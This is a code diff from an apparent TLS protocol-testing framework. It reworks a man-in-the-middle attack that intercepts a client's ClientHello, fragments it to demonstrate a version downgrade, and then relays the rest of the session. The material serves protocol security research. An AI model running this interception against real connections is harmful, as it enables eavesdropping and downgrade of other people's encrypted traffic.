@@ -65,23 +65,18 @@ type Attack_FragmentClientHello =
     static member runMITM (accept, server_name:string, ?port:int) : state * state =
         let port = defaultArg port FlexConstants.defaultTCPPort in
 
-        // Start being a server
-        let sst,_ = FlexConnection.serverOpenTcpConnection("0.0.0.0",port=6666) in
+        // Start being a Man-In-The-Middle
+        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listener_port=6666,server_cn=server_name,server_port=port) in
+
+        // Receive the Client Hello and check that the protocol version is high enough
         let sst,nsc,sch = FlexClientHello.receive(sst) in
         if not (sch.pv = TLS_1p2 || sch.pv = TLS_1p1) then
             failwith "Fragmented ClientHello should use TLS > 1.0 to demonstrate the downgrade"
         else
-
-        // Start being a client
-        let cst,_   = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in
-        
+                
         // Reuse the honest client hello message, but apply fragmentation
-        let cst     = FlexHandshake.send(cst,sch.payload,One(5)) in
-        let cst     = FlexHandshake.send(cst) in
-
-        // Forward server hello
-        let cst,_,csh   = FlexServerHello.receive(cst,sch,nsc) in
-        let sst = FlexHandshake.send(sst,csh.payload) in
+        let cst = FlexHandshake.send(cst,sch.payload,One(5)) in
+        let cst = FlexHandshake.send(cst) in
 
         // Forward the rest of the handshake and the application data
         FlexConnection.passthrough(cst.ns,sst.ns);
